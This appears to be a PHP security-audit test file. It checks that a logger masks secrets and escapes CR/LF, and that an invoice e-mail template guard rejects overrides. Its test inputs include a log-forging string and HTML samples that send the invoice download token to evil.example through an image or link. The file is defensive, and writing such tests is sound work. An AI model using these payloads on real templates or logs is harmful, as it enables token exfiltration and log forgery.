<?php

// Round 9 review (2026-10-23), technical leftovers and low findings.
echo "\n--- Audit round 9 (low): logging, templates, leftovers ---\n";

// Logger::phpLog: a secret inside JSON ("client_secret":"x") or under a longer key (stripe_secret_key) was written in
// clear, and a CR/LF in an exception message started a forged line of its own in the PHP error log.
$r9lLogDir = sys_get_temp_dir() . '/bbe-r9low-log-' . bin2hex(random_bytes(4));
mkdir($r9lLogDir);
$r9lPhpLog = $r9lLogDir . '/php-error.log';
$r9lPrevLog = ini_set('error_log', $r9lPhpLog);
try {
    Logger::phpLog('PayU token error: {"access_token":"r9l-tok-1","client_secret": "r9l-cs-2","stripe_secret_key":"sk_live_r9l3","order_id":7}'
        . " url?token=r9l-q4&page=2\n[24-Oct-2026 02:00:00 UTC] PHP Fatal error: forged by input\r\x07end");
} finally {
    ini_set('error_log', (string)$r9lPrevLog);
}
$r9lLogged = (string)@file_get_contents($r9lPhpLog);
@unlink($r9lPhpLog);
@rmdir($r9lLogDir);
assert_true(!preg_match('/r9l-tok-1|r9l-cs-2|sk_live_r9l3|r9l-q4/', $r9lLogged) && str_contains($r9lLogged, '"order_id":7') && str_contains($r9lLogged, '&page=2'),
    "R9 logs: the PHP log masks JSON and query-string secrets and keeps the rest ({$r9lLogged})");
assert_true(substr_count(rtrim($r9lLogged, "\r\n"), "\n") === 0 && str_contains($r9lLogged, '\n[24-Oct-2026') && str_contains($r9lLogged, '\r\x07end'),
    'R9 logs: CR/LF and control characters are escaped, so the message stays one line and cannot forge another');
assert_equals(['response' => '{"access_token":"[REDACTED]","expires_in":3600}'], Logger::redact(['response' => '{"access_token":"r9l-tok-5","expires_in":3600}']),
    'R9 logs: the structured log masks a token inside a JSON string as well');

// Template guard: the invoice link carries the download token (#token) but was not a secret variable, so an override
// could put it into an image or another site's URL and hand the invoice to that server.
$r9lInvoiceErrors = static fn(string $html, string $text = ''): string => implode(' ', EmailTemplates::validate('invoice_issued', 'Invoice {{invoice_number}}', $html, $text));
$r9lShipped = EmailTemplates::fileSource('invoice_issued', 'en');
assert_equals('', $r9lInvoiceErrors((string)$r9lShipped['html'], (string)($r9lShipped['text'] ?? '')), 'R9 template guard: the shipped invoice e-mail (link and plain URL) passes');
foreach (['<p><img src="https://evil.example/p.gif?u={{invoice_download_url}}" alt=""></p>', '<p><a href="https://evil.example/?next={{invoice_download_url}}">Invoice</a></p>',
    '<p><a href="{{invoice_download_url}}" title="{{invoice_download_url}}">Invoice</a></p>'] as $r9lLeak) {
    assert_true(str_contains($r9lInvoiceErrors($r9lLeak), 'invoice_download_url'), 'R9 template guard: the invoice link may not be part of another URL or attribute (' . $r9lLeak . ')');
}
